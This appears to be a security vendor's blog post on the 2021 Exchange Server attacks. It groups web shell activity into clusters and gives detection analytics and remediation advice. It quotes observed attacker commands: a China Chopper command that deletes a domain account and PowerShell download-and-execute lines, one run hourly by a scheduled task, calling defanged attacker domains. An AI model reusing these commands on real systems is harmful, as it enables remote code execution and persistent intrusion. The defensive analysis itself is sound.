While Microsoft initially attributed these attacks to a](https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/)\nsuspected Chinese state-sponsored group that it calls “HAFNIUM,” over the last few days\nit’s become clear that numerous activity clusters are exploiting these vulnerabilities.\n\n[On February 28, a few days before the release of Microsoft’s security bulletin, we started to](https://msrc-blog.microsoft.com/2021/03/02/multiple-security-updates-released-for-exchange-server/)\nobserve a noticeable increase in suspicious web shell activity emanating from Microsoft\nExchange servers. In the week that’s passed since, we’ve issued dozens of potentially\nrelated threat detections. We do not know for certain whether all of the malicious activity\nwe’re seeing is the result of adversaries targeting the vulnerabilities that Microsoft\naddressed in its security bulletin last week, but we assess that it’s likely, based on the timing\nand victimology. The analytics that have helped us detect these intrusions—and, to some\nextent, the remediation process for cleaning up after a successful compromise—are\nrelevant for detection and remediation of web shells and post-exploitation activity in general,\nregardless of whether it’s related to the recently patched vulnerabilities or not.\n\nThere’s been a deluge of reporting (some of which we link at the end of this post) on\nHAFNIUM and other adversaries exploiting four vulnerabilities affecting on-premises\n[Exchange server systems (CVE-2021-26855,](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855) [CVE-2021-26857,](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26857) [CVE-2021-26858, and](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26858)\n\n\n-----\n\n[CVE-2021-27065). As is so often the case, these reports can be overwhelming in the](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-27065)\naggregate. We’re sharing our experience and guidance to help others make sense of how\nto cluster, detect, and remediate activity potentially related to the above vulnerabilities.\nWe’ve broken things down into three sections, depending on what you’re looking for:\n\nThe different [clusters of threat activity we’re seeing](https://redcanary.com/blog/microsoft-exchange-attacks/#clusters)\nThe [detection analytics we’ve used to detect them](https://redcanary.com/blog/microsoft-exchange-attacks/#detection)\nThe simple [remediation steps you can take to start to remove this activity from your](https://redcanary.com/blog/microsoft-exchange-attacks/#remediation)\nenvironment if you find it, whether you’re a single administrator or a mature security\nteam.\n\n## Multiple activity clusters\n\nAs we’ve begun analyzing the flurry of web shells stemming from suspected Exchange\nexploitation, we’ve noticed a few clusters of activity based on different TTPs and web shell\nnames. Because none of these clusters overlap significantly with what Microsoft reported\n[on as HAFNIUM, we are tracking them separately. We don’t know who is behind these](https://redcanary.com/blog/apt-attribution-rsa/)\nclusters—we aren’t sure if it’s the same adversaries working together or different\nadversaries completely. We’re focusing narrowly on what we observe on victim servers for\nour clustering.\n\n[Other organizations are tracking different clusters as well. FireEye shared information about](https://www.fireeye.com/blog/threat-research/2021/03/detection-response-to-exploitation-of-microsoft-exchange-zero-day-vulnerabilities.html)\n[three “UNC” (uncategorized) clusters, and Unit 42 shared analysis of different patterns they](https://unit42.paloaltonetworks.com/china-chopper-webshell/)\nhave observed in recent China Chopper web shells. Because each organization has\ndifferent visibility and methodology, it makes sense for everyone to track their own clusters\nto meet their team’s requirements.\n\n### The initial “random-eight-character” China Chopper cluster\n\nFrom February 27 through at least March 3, we noticed a cluster of activity in which the\nChina Chopper web shell was dropped onto Exchange servers in the directory\n`C:\\inetpub\\wwwroot\\aspnet_client\\system_web`. The web shell `.aspx` files would be\nnamed with eight random alphanumeric characters, for example:\n```\nc:\\inetpub\\wwwroot\\aspnet_client\\system_web\\zxvt0lpt.aspx \nc:\\inetpub\\wwwroot\\aspnet_client\\system_web\\r07azcq5.aspx \nc:\\inetpub\\wwwroot\\aspnet_client\\system_web\\dvgippna.aspx\nC:\\inetpub\\wwwroot\\aspnet_client\\system_web\\xpy07b5a.aspx\n\n```\n\n-----\n\nFollowing the web shell file being dropped, we then observed follow-on activity that\noccurred some time between a few hours and a few days later. Though the exact eightcharacter web shell filename differed, the following commands were consistent across\nmultiple victims:\n```\n\"cmd\" /c cd /d \"C:\\\\inetpub\\\\wwwroot\\\\aspnet_client\\\\system_web\"&net group \"Exchange\nOrganization administrators\" administrator /del /domain&echo [S]&cd&echo [E]\n\n```\nThe string `&echo [S]&cd&echo [E] appears to be unique to the China Chopper web`\n[shell, based on previous research from FireEye and others.](https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-ii.html)\n\n### Sapphire Pigeon\n\nOn March 5, we noticed a unique cluster of activity across multiple environments that didn’t\nmatch what we had we had previously seen—either in our own detections or in public\nreporting around these incidents. Since we use colors and birds for our activity clusters, we\nnamed this one “Sapphire Pigeon.”\n\nThis Sapphire Pigeon cluster also started with likely China Chopper web shells, but the\nfilenames were not eight random characters. Adding to the complexity, we observed\nadversaries dropping multiple web shells on some victims, including the following filenames\n(note that these are not unique to the Sapphire Pigeon cluster on their own):\n\n\n-----\n\n```\nc:\\program files\\microsoft\\exchange\nserver\\v15\\frontend\\httpproxy\\owa\\auth\\redirsuiteserverproxy.aspx\nc:\\inetpub\\wwwroot\\aspnet_client\\supp0rt.aspx\nc:\\inetpub\\wwwroot\\aspnet_client\\shell.aspx\nc:\\inetpub\\wwwroot\\aspnet_client\\load.aspx\nC:\\inetpub\\wwwroot\\aspnet_client\\discover.aspx\n\n```\nInterestingly, these shells were dropped on victims at different times, some days before we\nobserved any follow-on activity. We have seen these same web shell names show up on\nmany other machines in the absence of other Sapphire Pigeon indicators, so we’ve\ndetermined that these filenames alone are not sufficient to distinguish distinct clusters.\n\nHowever, we observed unique follow-on activity after the web shells were dropped that we\ndecided were useful for clustering. Sapphire Pigeon exhibited the following unique patterns,\n[which we tweeted about on afternoon of March 5:](https://twitter.com/redcanary/status/1367935292724948992)\n\nUse of encoded PowerShell to connect to a remote host. `powershell.exe was a`\nchild of `cmd.exe, which spawned from` `w3wp.exe . (Check out the detection`\nopportunities section below!)\n```\nDecoded command line:\nIEX (New-Object\nNet.WebClient).downloadstring('hxxp[:]//p.estonine[.]com/p?e')\n\n```\nCreation of a scheduled task named `Winnet :`\n```\n\"C:\\Windows\\system32\\schtasks.exe\" /create /ru system /sc MINUTE /mo 45 /tn Winnet\n/tr \"powershell -ep bypass -e\nSQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkA\n /F\nDecoded base64 command line string:\nIEX (New - Object Net.WebClient).downloadstring('hxxp[:]//cdn.chatcdn[.]net/p?\nhig210305')\n\n```\n[Sapphire Pigeon activity overlaps significantly with activity reported by Carbon Black TAU in](https://www.carbonblack.com/blog/cb-tau-technical-analysis-dltminer-campaign-targeting-corporations-in-asia/)\nJuly 2019, including use of the domains p.estonine[.]com and cdn.chatcdn[.]net as well as\nthe scheduled task name `Winnet . However, unlike what Carbon Black previously`\nobserved, we did not observe DLTMiner being dropped as a follow-on payload.\n[Huntress Labs also observed similar activity. In their](https://twitter.com/KyleHanslovan/status/1368071668678201344) [analysis of follow-on payloads, they](https://twitter.com/_johnhammond/status/1368959515958329347)\nidentified highly obfuscated PowerShell as well as Mimikatz, but there has been no\nindication of DLTMiner being delivered.\n\n\n-----\n\n### Other activity that didn t cluster\n\nWe’ve also seen other web shell activity that we haven’t clearly been able to cluster. We\nwant to have significant overlaps on multiple unique data points to cluster activity, and in\nsome cases, we don’t have that. We don’t consider the following web shell filenames\nunique enough on their own to cluster with anything else right now, though we will likely\nidentify new clusters over time. Here are a few of the many web shell names we’ve seen for\nreference (it appears the web shell names change frequently, so we don’t recommend\nrelying solely on these—more durable detection opportunities are below!):\n```\nc:\\program files\\microsoft\\exchange\nserver\\v15\\frontend\\httpproxy\\owa\\auth\\outlooken.aspx\nc:\\program files\\microsoft\\exchange\nserver\\v15\\frontend\\httpproxy\\owa\\auth\\outlookzh.aspx\nc:\\program files\\microsoft\\exchange\nserver\\v15\\frontend\\httpproxy\\owa\\auth\\outlookus.aspx\nc:\\inetpub\\wwwroot\\aspnet_client\\system_web\\4_0_30319\\err0r.aspx\nc:\\program files\\microsoft\\exchange\nserver\\v15\\frontend\\httpproxy\\owa\\auth\\error.aspx\nc:\\program files\\microsoft\\exchange\nserver\\v15\\frontend\\httpproxy\\owa\\auth\\front.aspx\n\n## Detection opportunities\n\n```\nGiven our endpoint-centric visibility, it’s difficult for us to determine without doubt the initial\ninfection vector for all recent intrusions targeting Exchange servers. However, we’ve been\nable to consistently detect the abnormally high volumes of web shell activity over the last\nweek or so with just a handful of detection analytics. The analytics are useful across the\nactivity clusters described above, and we developed most of them prior to the start of this\nExchange server exploitation activity, so these should be useful beyond just this activity.\n\n### IIS worker process spawning cmd.exe and net.exe\n\nThis first detection opportunity identifies instances of the Windows IIS worker process\n( w3wp.exe ) spawning the Windows Command Processor ( cmd.exe ) and using net\ncommands for initial reconnaissance purposes. You can detect this by looking for a process\nthat appears to be `w3wp.exe spawning a process that appears to be` `cmd.exe, which`\nthen spawns a process that appears to be `net.exe . Looking for this process lineage is`\nhelpful because we have observed the specific net commands can differ from one victim to\nthe next.\n\n\n-----\n\n### IIS worker process spawning cmd.exe with echo\n\nA similar analytic that’s been helpful in detecting web shells is one that identifies a chain of\nexecution from a Windows IIS worker process ( w3wp.exe ) spawning the Command\nProcessor ( cmd.exe ) and using the `echo command to send data back to a web shell.`\nYou can alert on this activity by looking for a process that is `w3wp.exe spawning`\n```\ncmd.exe in tandem with a command line that includes the term echo . As noted above,\n\n```\nthe string `&echo [S]&cd&echo [E] appears to be unique to China Chopper.`\n\n### IIS worker process writing .asp and .aspx files\n\nAnother solid behavioral analytic looks for instances of the Windows IIS worker process\n(`w3wp.exe`) writing files that are typically associated with executable web server code to\ndisk. Of all the detection ideas here, this one might be the most likely to generate false\npositives, so be prepared to tune this as needed. Narrowing down file paths where these\n\n\n-----\n\nfiles are written is a useful way to help refine this analytic. You can detect these behaviors\nby looking for the execution of a process that appears to be `w3wp.exe` along with the\ncreation of files with webfile extensions like `.asp` and `.aspx` in any of the following file\npaths:\n```\n   inetpub\\wwwroot\\aspnet_client\n   FrontEnd\\HttpProxy\\owa\\auth\n\n```\nWe recommend this approach to look for web shell files because we’ve observed that so\nmany different web shell file names have been used. These two file paths are the most\ncommon ones we have observed, so we want to focus on those for simplicity’s sake, though\nother file paths are used as well. Check out the resources linked at the end of this for\nadditional file paths other teams have observed.\n\n### IIS worker process spawning cmd.exe and powershell.exe\n\nWe now move on to detection opportunities for post-exploitation behavior we’ve observed\nafter the initial web shells being dropped. In our Sapphire Pigeon cluster, we observed the\nadversary leveraging the IIS Worker process ( w3wp.exe ) to spawn the Command\nProcessor in a manner that’s consistent with web shell activity. You can detect this activity\nby monitoring for a chain of process executions from a Windows IIS worker process\n( w3wp.exe ) that spawns a process that appears to be the command processor\n( cmd.exe ), which, in turn, launches PowerShell ( powershell.exe or `pwsh.exe ). The`\nfollowing image shows activity we’ve observed with the cluster we call Sapphire Pigeon, but\nthis analytic could help detect other malicious behavior as well:\n\n\n-----\n\n### Scheduled task execution with create and powershell\n\nOne detection opportunity is to alert on a process that appears to be `schtask.exe`\nexecuting with a corresponding command line that includes `create and` `powershell .`\nThe following image shows Sapphire Pigeon activity, but this analytic is useful beyond\ndetecting just that cluster:\n\n### Additional post-exploitation detection opportunities\n\nWhile we wanted to focus detection opportunities on what we have observed recently, there\nare a wealth of other opportunities to detect any follow-on post-exploitation activity that\nmight occur after these web shells are dropped. For more opportunities, check out the 2020\nThreat Detection Report, [this blog post, or the many excellent resources from other teams](https://redcanary.com/blog/dfdr-consulting/)\nat the end of this post.\n\n## Remediation advice\n\nOnce you’re able to hunt for or otherwise detect web shell activity, you have to be able to\nthen remediate it.\n\nThe first and most important remediation step that anyone can take is to patch their\nvulnerable Exchange servers immediately. You can do so by applying the March 2021\nExchange Server Security Updates issued by Microsoft for Exchange 2013, 2016, and\n[2019. Even if you are on an older Cumulative Update, Microsoft released security updates](https://techcommunity.microsoft.com/t5/exchange-team-blog/march-2021-exchange-server-security-updates-for-older-cumulative/ba-p/2192020)\nto protect against these specific vulnerabilities only. We also recommend using the\nMicrosoft Support Emergency Response Tool (MSERT) to scan the Exchange server per\nguidance.\n\n\n-----\n\n[If you cannot patch your Exchange system, Microsoft also published recommendations to](https://msrc-blog.microsoft.com/2021/03/05/microsoft-exchange-server-vulnerabilities-mitigations-march-2021/)\ncreate IIS rewrite rules, disable Unified Messaging services, and disable multiple IIS\napplication pools. These stopgap measures will likely affect the availability of your\nExchange services internally and externally, depending on what features your organization\nuses. Administrators should not implement these as permanent mitigations.\n\nHowever, patching alone is not enough to handle this! You also need to look for any\nsigns of compromise on your server.\n\n### Looking for signs of compromise\n\nIf your Exchange server was unpatched and exposed to the internet, you should assume\ncompromise. We advise taking these systems offline briefly to perform an investigation. In\nevery incident we’ve seen so far there have been web shells dropped into the filesystem,\nand in some incidents, we’ve observed adversaries using scheduled tasks for persistence\nas well as other follow-on activity. Even if you don’t have a large security team, you can\nperform these steps to start remediation. While we don’t expect any of these actions to\ncause harm to a server, before deleting any artifacts from a server, we recommend ensuring\nthey are not critical for your server to operate.\n\nDuring the downtime you should evaluate possible persistence mechanisms using\n[Sysinternals Autoruns if you do not have any other security tools to do so. Disable or](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)\nremove any scheduled tasks or autorun Windows Registry Keys that are seemingly\nsuspicious or malicious for your environment. The persistence mechanisms will likely\nexecute PowerShell code or an executable binary uploaded by the adversary.\n\nIn addition, evaluate the ASP/ASPX files under `c:\\Inetpub\\wwwroot\\aspnet_client`\nand `<Exchange Installation>\\FrontEnd\\HttpProxy folders and subfolders. To`\nevaluate whether the content you find there might be malicious, compare it to these\nbaselines created by the Microsoft Exchange team. Anything that is not in that baseline\nshould be considered suspicious and should be removed if your organization cannot\ndetermine a legitimate need for it.\n\nIf you find suspicious ASP/ASPX files under the above folders, remove them from the disk.\nSome adversaries have also dropped executable (.exe) files within the folders. Examine\nany such EXEs with caution and remove any EXE files that are not part of the baseline from\ndisk if your organization cannot determine a legitimate need for them.\n\n\n-----\n\nAn additional step to take would be to examine processes currently executing using\n[Sysinternals Process Explorer. While there are many public resources on identifying](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer)\nmalicious processes with Process Explorer, based on what we’ve seen in these incidents,\nwe recommend focusing specifically on recently spawned PowerShell processes that have\nencoded command lines or URLs inside the command lines. An excellent example of\n[Process Explorer for this use was covered in this blog post, and image from which we show](https://holdmybeersecurity.com/2019/02/27/sysinternals-for-windows-incident-response/)\nbelow.\n\nFinally, before making the server accessible to the internet again, apply the relevant\npatches to prevent further exploitation.\n\nThese are simple steps that we hope anyone can take on servers they suspect are\nvulnerable or compromised. If you identify suspicious files, there is a possibility additional\npost-exploitation activity could have occurred. A full response would involve following\n[recommendations such as those provided by CISA. However, we realize not all](https://us-cert.cisa.gov/ncas/alerts/aa21-062a)\norganizations have the expertise or resources to do this, so the above steps are a starting\npoint for remediation if you cannot perform further investigation and response.\n\n## Other resources\n\nMany other teams are putting out great research on this, so we wanted to highlight some of\nthat here if you’re looking for more info:\n\n**Microsoft**\n\n\n-----\n\n[HAFNIUM targeting Exchange Servers with 0-day exploits](https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/)\n\n[Multiple Security Updates Released for Exchange Server](https://msrc-blog.microsoft.com/2021/03/02/multiple-security-updates-released-for-exchange-server/)\n\n[Microsoft Exchange Server Vulnerabilities Mitigations](https://msrc-blog.microsoft.com/2021/03/05/microsoft-exchange-server-vulnerabilities-mitigations-march-2021/)\n\nMarch 2021 Exchange Server Security Updates for older Cumulative Updates of Exchange\nServer\n\n**FireEye**\n\n[Detection and Response to Exploitation of Microsoft Exchange Zero-Day Vulnerabilities](https://www.fireeye.com/blog/threat-research/2021/03/detection-response-to-exploitation-of-microsoft-exchange-zero-day-vulnerabilities.html)\n\n**Volexity**\n\nOperation Exchange Marauder: Active Exploitation of Multiple Zero-Day Microsoft\nExchange Vulnerabilities\n\n**CrowdStrike**\n\n[How Falcon Complete Stops Microsoft Exchange Server Exploits](https://www.crowdstrike.com/blog/falcon-complete-stops-microsoft-exchange-server-zero-day-exploits/)\n\n**Huntress Labs**\n\n[Twitter thread by Kyle Hanslovan](https://twitter.com/KyleHanslovan/status/1368071668678201344)\n\n[Microsoft Exchange Incident “China Chopper” ASPX Webshell filenames](https://gist.github.com/JohnHammond/0b4a45cad4f4ed3324939d72dc599883)\n\n[Analysis – Post-Exploitation from Microsoft Exchange HAFNIUM](https://youtu.be/rn-6t7OygGk)\n\n**CISA**\n\n[Mitigate Microsoft Exchange Server Vulnerabilities | CISA](https://us-cert.cisa.gov/ncas/alerts/aa21-062a)\n\n**Unit 42**\n\n[Analyzing Attacks Against Microsoft Exchange Server With China Chopper Webshells](https://unit42.paloaltonetworks.com/china-chopper-webshell/)\n\n_Disclaimer: The information in the Red Canary Blog is made available for educational_\n_purposes only.
